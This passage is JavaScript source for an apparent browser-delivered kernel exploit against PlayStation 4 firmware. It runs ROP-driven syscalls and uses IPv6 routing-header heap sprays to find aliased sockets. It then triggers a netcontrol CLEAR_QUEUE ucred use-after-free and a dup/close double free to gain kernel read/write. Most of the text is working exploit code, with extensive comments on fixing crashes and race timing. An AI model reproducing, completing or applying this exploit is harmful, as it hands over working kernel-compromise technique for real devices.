            check("thread-attrs-restored-power-off-safe", good, "");

            /*
            Workers last, reported separately. By here main is already
            restored AND verified, so if these 16 RPCs never come back the
            console can still be shut down normally.
            */
            /*
            THIS LOOP WAS THE WATCHDOG. 8 workers x 2 ROP calls, each with a
            5000 ms timeout, run back-to-back on the main JS thread with no
            event-loop turn between them. After the race the workers are
            often still parked inside the kernel, so each fireW waits its
            full budget before rejecting: 8 x 2 x 5 s = up to 80 s of
            unbroken synchronous work. The watchdog fires long before that,
            which is exactly where the console dies -- the log's last line is
            thread-attrs-restored-power-off-safe and the status reads
            remove_uaf_file..., i.e. between this loop and the next mark.

            Two changes:
              1. breathe() before each worker, so the stretch is bounded by
                 the wall clock rather than by 16 x timeoutMs.
              2. a much shorter per-call timeout. The purpose here is only to
                 drop the worker off realtime-on-core-7 so the console can
                 power off. A worker that has not answered in 250 ms is not
                 going to, and the outer finally terminate()s it anyway -- so
                 waiting 5 s buys nothing but the watchdog.
            */
            const RESTORE_MS = params.has("restorems")
                ? parseInt(params.get("restorems"), 10) : 250;
            /*
            WORKERS: ASSERTIVE, NOT BLOCKING.

            WORKER-ATTRS-RESTORED at the bottom of this block is the mark that
            never printed -- the watchdog fires inside this loop. The loop
            only exists to drop each worker off realtime-on-core-7 so the
            console can power off. Two facts make the whole thing optional:

              * The main thread is already restored AND verified by the
                power-off-safe check above, and that is the thread the console
                has to shut down.
              * The outer finally does w.rpc("disarm") then terminate() on
                every worker, and a thread's realtime priority dies with the
                thread.

            So each RPC is now fire-and-forget-with-a-deadline rather than a
            blocking await: we START the call, give the event loop a turn, and
            move on. If a worker answers, great; if it is still parked inside
            the kernel from the race, we do not sit on the main thread waiting
            for it. Nothing downstream depends on the result.

            This removes the unbounded wait structurally instead of tuning it.
            */
            const wr0 = Date.now();
            let wr = 0, wn = 0, started = 0;
            /*
            A REAL YIELD, NOT breathe().

            The comment above claims `breathe()` bounds this loop by the wall
            clock. It does not, and that is why WORKER-ATTRS-RESTORED is the
            mark that never prints. breathe() (rop.js:58-62) returns WITHOUT
            touching a timer whenever less than BREATHE_BUDGET_MS (8 ms) has
            elapsed since its last ACTUAL yield -- so on a run where the loop
            body is fast it yields once and then stops yielding entirely.
            Eight armed workers x 2 fireW( layoutContext + postMessage ) then
            accumulate into one unbroken synchronous stretch, which is exactly
            the window the watchdog fires in.

            A setTimeout(0) every iteration is unconditional: it always gives
            the event loop a turn, so the stretch can never exceed one loop
            body no matter how many workers are armed. The cost is one timer
            per worker on a path that runs once, after the race.
            */
            /*
            FREE THE RACERS FIRST, AND THIS IS THE LAST PLACE IT CAN BE DONE.

            Every fireW below -- here and in the outer finally -- passes a
            FINITE timeout, so a worker still inside recvmsg from the race
            reports "worker-N: timeout waiting for fire" and holds this loop
            for its whole budget. That message is not evidence of a wedged
            worker; by this point it is almost always evidence of ONE LOST
            WAKE BYTE several seconds earlier.

            rescueRacers is bounded (rescuems, 1500 ms) and stops the moment
            racerMask shows nothing parked, so on the normal path -- every
            racer already out -- it returns immediately and costs one frame
            read per worker. On the damaged path it either frees them or
            proves they really are inside the kernel, which is exactly the
            distinction the fire() timeout was never able to make.
            */
            if (typeof tasks !== "undefined" && tasks && tasks.length) {
                await rescueRacers(tasks, "teardown");
            }
            for (const w of workers) {
                await new Promise(r => setTimeout(r, 0));
                if (!w.armed) continue;
                wn++;
                try {
                    new Uint8Array(maskAb).fill(0xff);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                    prioDv.setUint16(2, 0, true);
                    /*
                    fireW lays out the ROP context and returns the RPC
                    promise. Do NOT await it: a worker parked in readv() from
                    the race would otherwise block this thread for the whole
                    budget, and there is nothing we need back from it.
                    */
                    const p1 = fireW(w, SYS.cpuset_setaffinity,
                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr],
                        RESTORE_MS);
                    const p2 = fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr],
                        RESTORE_MS);
                    started += 2;
                    /*
                    Count from the callbacks only. An earlier version of this
                    checked a local `both` flag on the line after .then(),
                    which is always still true: .then() runs its callback on a
                    LATER microtask, so `unawaited++` never fired and the
                    diagnostic always reported 0. Derive the shortfall from
                    wr vs started at the mark instead -- that is measured, not
                    assumed.
                    */
                    p1.then(() => { wr++; }, () => { });
                    p2.then(() => { wr++; }, () => { });
                } catch (e) { }
            }
            /*
            Give the started RPCs one real chance to land, bounded by a short
            grace period so this cannot become the hang it replaced. The
            workers are terminated in the finally regardless.
            */
            const GRACE_MS = params.has("restoregrace")
                ? parseInt(params.get("restoregrace"), 10) : 500;
            /*
            Bounded close-out. `wr < started` is read fresh each turn, so the
            loop exits as soon as every started RPC has settled -- and always
            exits at the deadline. Date.now() is checked BEFORE the await, so
            a worker that never answers cannot extend the loop past
            GRACE_MS + one breathe() turn.
            */
            const wdeadline = Date.now() + GRACE_MS;
            while (Date.now() < wdeadline && wr < started)
                await new Promise(r => setTimeout(r, 0));
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/"
                + wn + " started=" + started
                + " shortfall=" + (started - wr) + "/" + started
                + " elapsed_ms=" + (Date.now() - wr0));
        }

        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
            + " rtprio={" + savedPrio + "}");
        prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioDv.setUint16(2, RTP, true);
        new Uint8Array(maskAb).fill(0);
        maskDv.setUint32(0, 1 << MAIN_CORE, true);

        {
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0,
                "core=" + MAIN_CORE + " rtp=" + RTP
                + " affinity=" + a + " rtprio=" + r);
        }
        function fireW(w, num, args, timeoutMs) {
            layoutContext(w.ctx, off, G, argGadget, JSVALUE_UNDEFINED, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                w.ctx.S.low, w.ctx.S.hi);
        }
        for (const w of workers) {
            await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
            // 2000 ms budget on BOTH calls (the first used to take the 15000 ms
            // default, which is longer than the watchdog on its own).
            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 2000);
            await breathe();
        }
        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
            + " rtp=" + RTP);

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        /*
        PARENTHESIZED, and it matters. `(v & 0xffff0000) >>> 0 === RTHDR_TAG`
        parses as `>>> (0 === RTHDR_TAG)`, because `===` binds tighter than
        `>>>`. It only returned the intended boolean because RTHDR_TAG is
        non-zero, so `0 === RTHDR_TAG` is `false` and the shift becomes `>>> 0`.
        RTHDR_TAG = 0 would flip every socket to untagged. Every other site
        (masterTagInfo, tripletsAgree) already writes the parenthesized form;
        this was the one that got it right by accident.

        `got` is passed in so a STALE read can be rejected: readTag() only
        parses what the caller's getRthdr() left in leakDv, so a short copyout
        (which getRthdr reports as a non-negative length when R2 is off, and
        leaves stale bytes behind when R2 is on) would otherwise hand back the
        PREVIOUS socket's tag -- the exact way a twin pair gets fabricated.
        */
        function readTag(got) {
            if (R2_ON && (got < 0 || got < 8)) return { ok: false, idx: 0 };
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: ((v & 0xffff0000) >>> 0) === RTHDR_TAG, idx: v & 0xffff };
        }

        /*
        Sized from the constant, not 256: an undefined slot reads as falsy and
        would make findTwins skip every socket, i.e. silently never find a twin.
        */
        /*
        ASYNC + YIELD. 10 rounds x 256 sockets x 2 syscalls is up to 5,120
        synchronous ROP syscalls in one unbroken JS stretch -- that is one of
        the "This page is not responding" popups. These are post-commit
        reclaim scans (the refcount race below keeps its timing), so turning
        the event loop once per round lets JSC's sweeper run and is safe.
        */
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        async function findTwins(timeout) {
            const twinsT0 = Date.now();
            let taggedSeen = 0;
            /* Reads where the tag names this socket (the spray working) vs
               reads where it names a DIFFERENT slot (an actual alias). */
            let selfTag = 0, foreignTag = 0;
            for (let round = 0; round < timeout; ++round) {
                if (round) await breathe();
                for (let i = 0; i < ipv6.length; ++i) {

                    /*
                    breathe() PER SOCKET -- not per round.

                    This is the port from lapse.js, which calls await breathe()
                    inside every socket loop (lapse.js has 20 call sites; this
                    file had ZERO before this change). breathe() is WALL-CLOCK
                    keyed (module/rop.js:55-62): it yields only when the current
                    synchronous stretch has run longer than 8 ms. A round here
                    is 2 x 256 synchronous sc() ROP syscalls, and one sc() can
                    cost tens of milliseconds, so per-round yielding left the
                    watchdog staring at a single unbroken CPU stretch far past
                    its threshold -- "The Page Isn't Loading".

                    Calling it every iteration costs one Date.now() and a
                    comparison when the budget has not elapsed, so it is free
                    on the fast path and bounds the slow one.
                    */
                    await breathe();

                    /*
                    ITEM 6(a). Re-setting a burned socket frees the chunk it
                    aliases. sprayOk stays false so the read loop skips it too.
                    */
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);

                    /*
                    R2. A failed set (ENOBUFS) leaves this socket owning the
                    PREVIOUS tag. Trusting it can fabricate a twin pair, and
                    freeRthdr(twins.b) then frees a chunk another socket owns.
                    */
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    await breathe();
                    if (R2_ON && !sprayOk[i]) continue;
                    /*
                    Keep `got`, do not discard it. A non-negative return from
                    getRthdr is only a length, not proof the buffer was
                    refreshed -- under R2-off a short copyout is reported as a
                    valid length. readTag(got) refuses a too-short read instead
                    of parsing whatever the PREVIOUS socket left behind, which
                    is how a fabricated twin pair enters the refcount race.
                    */
                    const got = getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8);
                    if (got < 0) continue;
                    const t = readTag(got);
                    /*
                    BOUND t.idx FIRST. It is the low 16 bits of an arbitrary
                    kernel word, so it can be any value in 0..0xffff. Every
                    read of it below (sprayOk[t.idx], ipv6[t.idx]) must be
                    guarded, and the bound has to come before the first one.
                    */
                    if (!(t.idx >= 0 && t.idx < ipv6.length)) continue;
                    /*
                    R2: a failed set leaves the PREVIOUS tag on this socket, so
                    a socket that sprayed badly can still look tagged.
                    */
                    if (t.ok && R2_ON && !sprayOk[i]) continue;
                    /*
                    a AND b MUST BE DIFFERENT FD NUMBERS, NOT JUST DIFFERENT
                    SLOTS. t.idx !== i only proves the array positions differ;
                    ipv6[] is built from 256 socket() calls and the SAME fd can
                    occupy two slots (taken, closed, retaken into a later
                    slot). The log showed TWINS a=75 b=75 -- the "twin" was the
                    socket itself.

                    That is not a harmless duplicate: the caller's next act is
                    freeRthdr(twins.b), and the whole refcount race then runs
                    against ONE owner while believing there are two. It is a
                    self-inflicted double free of the same rthdr.

                    Guard on the fd value. Same reason findTriplet compares
                    `fd !== master && fd !== slave` (those are fds, so it was
                    already correct there).

                    AND THE SLOT IT NAMES MUST HAVE SPRAYED CLEANLY (R2). The
                    named slot is the OTHER owner, so it is the same failure as
                    above: a socket whose set failed still carries a stale tag
                    and would be reported as a twin that does not exist.
                    */
                    /*
                    COUNT THE TWO THINGS SEPARATELY, BECAUSE `tagged` ALONE IS
                    WORTHLESS AND LOOKS ALARMING.

                    The first version of this counter incremented on `t.ok`
                    -- any socket that read back RTHDR_TAG. But EVERY socket
                    reads back a tag, because the spray loop in this same
                    round just wrote one to each of them
                    (sprayDv.setUint32(4, tagFor(i))). A run reporting
                    `tagged=8192` after 32 rounds is therefore reporting
                    32 x 256 = 8192, i.e. "the spray worked", and says nothing
                    whatsoever about whether the double free aliased anything.

                    What a twin actually requires is socket i reading back a
                    tag that names a DIFFERENT slot: t.idx !== i AND a
                    different fd. That is `foreign` below, and it is the only
                    number here that relates to the double free at all.

                      foreign=0        no socket ever named another -- the
                                       freed chunk was not re-taken
                      foreign>0 but
                      no TWINS line    sockets named others, but the slot
                                       had failed its spray or shared the fd,
                                       so the pair was refused
                    `self` is the control: it counts reads where the tag names
                    this very socket, which must dominate on a healthy spray.
                    */
                    if (t.ok) {
                        taggedSeen++;
                        if (t.idx === i) selfTag++;
                        else foreignTag++;
                    }
                    if (t.ok && t.idx !== i && ipv6[t.idx] !== ipv6[i]
                        && (!R2_ON || sprayOk[t.idx]))
                        return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }

                /*
                PROGRESS EVERY 8 ROUNDS, BECAUSE THIS LOOP WAS COMPLETELY
                SILENT AND THAT MADE "SCANNING" AND "HUNG" INDISTINGUISHABLE.

                findTwins returns null without printing anything, so a run that
                reached DOUBLE-FREE and then sat on `attempt 2...` could be
                either (a) legitimately inside 64 rounds x 256 sockets x 2 ROP
                syscalls = 32,768 calls, or (b) dead. The DOM shows the same
                thing in both cases, and the only way to tell them apart was to
                infer from elapsed time.

                findTriplet already has both halves of this (TRIPLET-<tag> on a
                hit, TRIPLET-<tag>-MISS on exhaustion); findTwins had neither.
                One line per 8 rounds is ~8 lines over a full 64-round scan and
                turns the ambiguity into a readable trace: if the last line is
                TWINS-ROUND round=56, the scan is alive and nearly done; if the
                last line is TWINS-SCAN round=0, it died on round 0.
                */
                if ((round & 7) === 7) {
                    const dt = Date.now() - twinsT0;
                    const rdone = round + 1;
                    mark("TWINS-ROUND", "round=" + rdone + "/" + timeout
                        + " self=" + selfTag + " foreign=" + foreignTag
                        + " at=" + dt + "ms"
                        + " eta=" + Math.round(dt / rdone * timeout) + "ms");
                }
                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            /*
            AND AN EXPLICIT MISS, matching findTriplet's -MISS line. Without
            it the only record of a full scan is the absence of a TWINS line,
            which reads identically to the scan never having run.
            */
            /*
            THE VERDICT LINE, AND THE COUNTS THAT MAKE IT READABLE.

            `self` is every socket reading its OWN tag back -- the spray
            working, which is expected and proves nothing about the alias.
            `foreign` is a socket reading a tag that names a DIFFERENT slot,
            which is the ONLY state that can become a twin.

              foreign = 0      NO socket ever named another. The freed chunk
                               is not in any rthdr's hands, so the double
                               free did not re-take. This is a kernel-state
                               result, not a JS one -- ?twinrounds= will not
                               help; more rounds cannot create an alias that
                               the double free never made.
              foreign > 0 but
              still a MISS     sockets DID name others, and every such pair
                               was refused -- by the fd-equality guard or by
                               R2 rejecting a partner slot whose set failed.
                               That is the case extra rounds CAN fix, and it
                               is worth raising ?twinrounds= for.

            Splitting them is the whole point: the previous `tagged=` number
            was `self + foreign`, and on this console it read 8192/16384 at
            round 32 -- which looked like near-success and was in fact 100%
            `self`, i.e. no evidence of an alias at all.
            */
            mark("TWINS-MISS", "rounds=" + timeout
                + " self=" + selfTag + " foreign=" + foreignTag
                + "/" + (timeout * ipv6.length)
                + " ms=" + (Date.now() - twinsT0)
                + (foreignTag
                    ? " -- " + foreignTag + " read(s) named ANOTHER slot but"
                        + " no pair survived the guards; the alias may be real"
                        + " -- retry with a larger ?twinrounds="
                    : " -- NOT ONE socket read a foreign tag; every socket"
                        + " reads its own spray back, so the double free did"
                        + " not re-take this chunk on this attempt"));
            return null;
        }

        /*
        ASYNC + YIELD. Same reasoning as findTwins: 500 rounds x 256 sockets
        x 2 syscalls, or FIND_TRIPLET_FAST (5000) when ?uio retries -- 256k
        synchronous ROP calls is the popup. Every caller below awaits it.
        */
        async function findTriplet(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = [];
            let untagged = 0;
            /*
            GIVE UP WHEN THE MASTER NEVER PRODUCES A USABLE TAG.

            This loop resolves t1/t2 from the MASTER's tag word. If the master
            is not tagged, EVERY round sprays and reads back nothing, and the
            bound (500 normally, 5000 x 3 on a refind) is pure damage: each
            round is 2 x 256 synchronous ROP syscalls and a mark() that does a
            DOM write plus an XHR. That is the "stuck for long" run.

            A tagged master produces an idx on round 0 in every observed run,
            so a small run of consecutive fully-untagged rounds is enough to
            conclude the master is not a tagged owner and stop. Bounded by
            ?tripletuntagged= for an operator who wants to prove otherwise; a
            non-positive or unparsable value disables the bail and reinstates
            the old full-budget behaviour.
            */
            const UNTAGGED_BAIL = (function () {
                if (!params.has("tripletuntagged")) return 16;
                const n = parseInt(params.get("tripletuntagged"), 10);
                return ((n | 0) === n && n >= 1) ? n : 0;
            })();
            let untaggedStreak = 0;
            for (let round = 0; round < rounds; ++round) {
                /*
                breathe() PER SOCKET. This loop is MAX_ROUNDS_TRIPLET (500)
                normally and FIND_TRIPLET_FAST (5000) on a refind, so the old
                `!(round % 8)` check let up to 8 x 256 = 2048 synchronous ROP
                syscalls run between yields. Ported from lapse.js, which calls
                await breathe() inside the socket loop rather than per round.
                */
                for (let i = 0; i < ipv6.length; ++i) {
                    await breathe();
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;   // ITEM 6(a)
                    sprayDv.setUint32(4, tagFor(i), true);
                    /*
                    ITEM 6(a), the other half. findTwins records sprayOk[] and
                    skips a socket whose set failed; this loop used to discard
                    the return. A socket whose re-spray failed (ENOBUFS) keeps
                    the PREVIOUS tag, so the master can read a stale idx back
                    and resolve to a socket that is not aliased at all -- a
                    fabricated t1/t2 that then passes check("ucred-triple-freed")
                    and feeds dead fds into make_karw. Track it the same way.
                    */
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }

                const gotM = getRthdr(master, IP6_RTHDR0_SIZE, 8);
                const t = gotM < 0 ? { ok: false, idx: 0 } : readTag(gotM);
                /*
                A stale tag is not a tag. Two SEPARATE reasons the word we
                just parsed is not ours to believe:

                  * this socket's OWN spray failed (R2), so it still carries
                    the PREVIOUS tag; and
                  * the parsed idx is not a valid slot at all.

                The second one is the one that was missing. `t.idx` comes from
                the low 16 bits of an arbitrary kernel word, so it can be any
                value in 0..0xffff -- and `sprayOk[t.idx]` on an out-of-range
                index is simply `undefined` (falsy), which would CLEAR ok for a
                perfectly good socket. Worse, with R2 OFF the whole check is
                skipped, so an out-of-range idx sailed straight into
                `ipv6[t.idx]` below. Bound it HERE, before anything reads it.
                */
                if (!(t.idx >= 0 && t.idx < ipv6.length)) t.ok = false;
                if (R2_ON && t.ok && !sprayOk[t.idx]) t.ok = false;
                /*
                R2-OFF STALE-TAG GUARD. With no sentinel there is no way to
                tell a fresh read from the previous round's word, so demand the
                master's tag matches THIS round's spray of the socket it names.
                `tagFor(t.idx)` is exactly what the spray just wrote to slot
                t.idx, so a match proves the word came from this round.
                */
                if (t.ok && !R2_ON && (t.idx & 0xffff) !== (tagFor(t.idx) & 0xffff))
                    t.ok = false;
                if (!t.ok) untagged++;
                const fd = t.ok ? ipv6[t.idx] : -1;
                if (seen.length < 6)
                    seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave
                    && !burned.has(fd)) {   // ITEM 6(a)

                    (/^(RE|UW)/.test(tag) ? trace : mark)
                        ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
                            + " untagged=" + untagged);
                    return fd;
                }
                /*
                UNTAGGED-STREAK BAIL. `untaggedStreak` was declared above but
                never wired in, so a master with no usable tag burned the full
                rounds budget anyway -- the exact hang this guard exists to
                stop. Count consecutive rounds in which the master produced no
                idx; any tagged read resets it.
                */
                if (t.ok) untaggedStreak = 0; else untaggedStreak++;
                if (UNTAGGED_BAIL > 0 && untaggedStreak >= UNTAGGED_BAIL) {
                    mark("TRIPLET-" + tag + "-UNTAGGED-BAIL", "round=" + round
                        + "/" + rounds + " master=" + master
                        + " streak=" + untaggedStreak + "/" + UNTAGGED_BAIL
                        + " -- master produced no usable tag; not burning the"
                        + " rest of the budget");
                    break;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave="
                + slave + " rounds=" + rounds + " untagged=" + untagged
                + "  first reads: " + seen.join(" "));
            return 0;
        }

        let bootErr = "";
        function bootFingerprint() {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            nameDv.setUint32(0, 1, true);
            nameDv.setUint32(4, 21, true);
            lenDv.setUint32(0, 0x10, true);
            lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
            const gotLen = lenDv.getUint32(0, true);
            const o = new DataView(outAb);
            const sec = o.getUint32(0, true);
            if (rv !== 0 || sec === 0) {
                bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
                return null;
            }
            return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
        }
        const boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        let lastCommitted = null;
        try { lastCommitted = localStorage.getItem("ps4lab_committed_boot"); }
        catch (e) { }
        if (boot && lastCommitted === boot && params.get("force") !== "1") {
            mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
            check("console-rebooted-since-last-committed", false,
                "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
            mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
                + " fail=" + checkCounts().failCount);
            return;
        }
        check("console-rebooted-since-last-committed", true,
            "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));

        let twins = null, triplets = null;

        /*
        ITEM 6(d). `committed` means "kernel state irreversibly touched" --
        reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
        whether an alias exists that we could NOT contain. poops.js:4356
        refuses on that condition, not on "we already fired".
        */
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) {
                mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                    + " reason=" + uncontained);
                break;
            }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);

            /*
            ONE MARK PER SYSCALL, BECAUSE THE LOG STOPPED AT "ATTEMPT 1/8".

            The log's last line was ATTEMPT 1/8 with the status reading
            "attempt 1...", so the run died on the FIRST sc() after those two
            calls -- and there were FOUR syscalls in a row with nothing logged
            between them:

                sc(SYS.socket, AF_UNIX, ...)      <- the dummy socket
                netcontrol(dummy, SET_QUEUE)      <- the arming registration
                sc(SYS.close, dummy)
                sc(SYS.setuid, 1)

            sc() is a SYNCHRONOUS ROP syscall on the main JS thread, so "died"
            here means one of these never returned: no exception, no timeout,
            no finally -- just a thread that is inside the kernel. With no mark
            between them the log cannot say WHICH, and that is the single
            biggest obstacle to diagnosing this stage. Each call now announces
            itself before it is entered, so the next crash names its own
            syscall.

            THE SUSPECT IS netcontrol(SET_QUEUE). It is the only one of the
            four that touches kernel event state rather than the fd table, and
            it is the only one the kernel can legitimately block on: it
            re-registers an existing socket on the kqueue-backed event queue,
            and on a console whose kernel is already half-poisoned -- which is
            exactly what BOOT rv=-1 errno=2 says this one is -- that call can
            sleep instead of returning. socket(), close() and setuid() all
            complete or fail immediately; netcontrol is the one that can wait.

            Note that BOOT is the control here: it too reported rv=-1 (ENOENT)
            and the run carried on past it, so sc() returning an error is
            normal and survivable. A call that does not return is the new
            failure mode, and it needs a different guard than rv === -1.
            */
            mark("ATTEMPT-SYS", "step=dummy-socket");
            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
            mark("ATTEMPT-SYS", "step=set-queue dummy=" + dummy);
            const reg = netevent(dummy, NETEVENT_SET_QUEUE);
            if (reg.rv === -1) {
                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
                sc(SYS.close, dummy); continue;
            }

            mark("ATTEMPT-SYS", "step=close-dummy");
            sc(SYS.close, dummy);
            mark("ATTEMPT-SYS", "step=setuid");
            sc(SYS.setuid, 1);
            mark("ATTEMPT-SYS", "step=uaf-socket");
            /*
            From here to the reclaim the socket state is armed, so the marks
            are kept to the pre-free side only. `step=uaf-socket` above is the
            last heavy mark before the free -- it runs while every fd is still
            live.
            */
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (uafSock !== dummy) {
                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                    + " got " + uafSock);
                if (uafSock !== -1) sc(SYS.close, uafSock);
                uafSock = 0;
                continue;
            }
            sc(SYS.setuid, 1);
            mark("ATTEMPT-SYS", "step=clear-queue uaf_sock=" + uafSock);
            const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
            /*
            console.log, NOT mark(), AND THIS ONE MATTERS.

            Every ATTEMPT-SYS mark up to here runs while uafSock still points
            at LIVE memory, so a heavy mark() is merely wasteful. This one does
            not: netevent(CLEAR_QUEUE) has just freed the ucred, and the fd
            still references it.

            mark() (module/log.js:247) is not a print -- it runs terse(),
            trailPush() (console.log AND localStorage.setItem of up to 400
            entries), createElement+appendChild, a scrollTop write (a
            SYNCHRONOUS layout flush) and a fresh XMLHttpRequest. All of that
            on the main thread with a freed ucred live underneath is exactly
            the hazard the UAF-ARMED comment block below describes, and the
            reason THAT mark was cut to the short fd+clear_rv form.

            Putting a heavy mark here -- one line above the comment explaining
            why heavy marks are forbidden here -- was a mistake in the
            instrumentation itself, and it can only make this stage worse.
            The reclaim loop's own per-round line already uses console.log for
            precisely this reason (browser process, no DOM, no XHR, no
            storage, survives a WebProcess death); this does the same.
            */
            try {
                console.log("[S10] clear-queue rv=" + clr.rv
                    + " uaf_sock=" + uafSock);
            } catch (e) { }
            /*
            UAF-ARMED IS A SIDE EFFECT OF CLEAR_QUEUE, AND NOTHING HEAVY MAY
            COME BETWEEN THEM.

            CLEAR_QUEUE (just above) frees the ucred. uafSock still points at
            it, and the ONLY thing that makes that survivable is the reclaim
            loop below re-taking the chunk and driving cr_refcnt back to 1.
            The reference (netctrl-vue.js:1199-1210) has NOTHING between the
            free and the reclaim -- write32, netcontrol, then straight into
            trigger_iov_recvmsg().

            This file did not. It ran a HEAVY mark() in that window:

              mark("UAF-ARMED", ... + " burned=" + burned.size
                   + (burned.size ? " burned_fds=" + [...burned].join(",") : "")
                   + " uaf_ss=" + iovSs.join(","));

            and mark() (module/log.js:247) is not a print. It does terse()
            (seven regexes), trailPush() -- console.log AND
            localStorage.setItem(JSON.stringify(up to 400 entries)) -- then
            createElement+appendChild (layout) then a scrollTop write (a
            SYNCHRONOUS layout flush) then a fresh XMLHttpRequest. All of that
            on the main thread, in the browser process, while a live socket
            still points at freed memory. [...burned] additionally allocates a
            Set spread.

            That is why the console died AT UAF-ARMED, with no time to print
            the clear_rv, and why it did it on every firmware from 11.00 to
            13.00: it is a JS-side ordering bug in the free->hold window, not
            an offsets problem. The frozen snapshot that "worked"
            (netctrl_snapshot.js:776) carried the short form of this line.

            So the line goes back to the SHORT form -- fd and clear_rv only --
            and everything diagnostic moves AFTER the reclaim loop, where the
            chunk is held again and heavy logging is safe. clear_rv is still
            reported, never tested: the reference ignores its value and the arm
            does not depend on it.
            */
            /*
            NOTHING BETWEEN THE FREE AND THE RECLAIM. See the block below --
            the mark and the bookkeeping that used to sit here now run AFTER
            the reclaim loop has re-held the chunk. CLEAR_QUEUE -> reclaim is
            the reference's order (netctrl-vue.js:1199-1210) and the reason
            this stage is safe at all.
            */

            /*
            THE MISSING STEP -- this is the UAF-ARMED crash on 11.00.

            The reference (netctrl-vue.js:1194-1210) does three things between
            CLEAR_QUEUE and the dup+close double free, not one:

              1199  netcontrol(CLEAR_QUEUE, uaf_socket)
                    // "Free the previous ucred. Now uafSock's cr_refcnt of
                    //  f_cred is 1."
              1202  for (i = 0; i < 32; i++)
              1204      trigger_iov_recvmsg()   <- 4 workers park inside recvmsg
              1205      sched_yield()
              1207      write(iov_sock_1, tmp, 1)  <- wake them
              1208      wait_iov_recvmsg()
              1209      read(iov_sock_0, tmp, 1)
              1214  close(dup(uaf_socket))          <- ONLY NOW the double free
            CLEAR_QUEUE frees the struct file AND the ucred. The reclaim loop
            in the middle is what re-takes that freed ucred chunk with a
            parked iovec and drives cr_refcnt back to 1, so the dup+close
            decrements a LIVE refcount-1 ucred. Without it the ucred stays
            freed, and the next syscall that touches uafSock dereferences
            free memory.

            What used to be here was 128 x sc(SYS.sendmsg, 0, msgAddr, 0).
            fd 0 is STDIN, not the iov socketpair, so that was not a reclaim
            of anything -- and the reference has no spray at all in this
            position. It armed, printed UAF-ARMED, then walked a freed ucred
            and took the console down, which is exactly the reported crash.

            Same park/wake machinery the rest of this file uses (fireW +
            iovSs), so the timing is unchanged -- only the step that was
            dropped is restored.
            */
            /*
            THE PRE-REFCOUNT RECLAIM, AND THE ACCOUNTING BUG THIS FILE KEEPS
            REPEATING.

            The loop body used to be:

                fire recvmsg on every worker
                sched_yield
                write iovWorkers.length bytes        <- FIXED COUNT
                await Promise.all(preTasks)
                read  iovWorkers.length bytes        <- FIXED COUNT
            That is the SAME unconditional wake/drain that unparkAll() and
            releaseIov() were already fixed for. A byte written for a worker
            that has not entered recvmsg yet stays in the socketpair buffer,
            and the read at the tail then consumes a byte meant for a
            DIFFERENT worker. Over 32 rounds that drifts, and the drift is
            invisible because scratch is 0x1000 bytes and nothing ever
            checked a return value.

            The consequence here is worse than in the race, because this runs
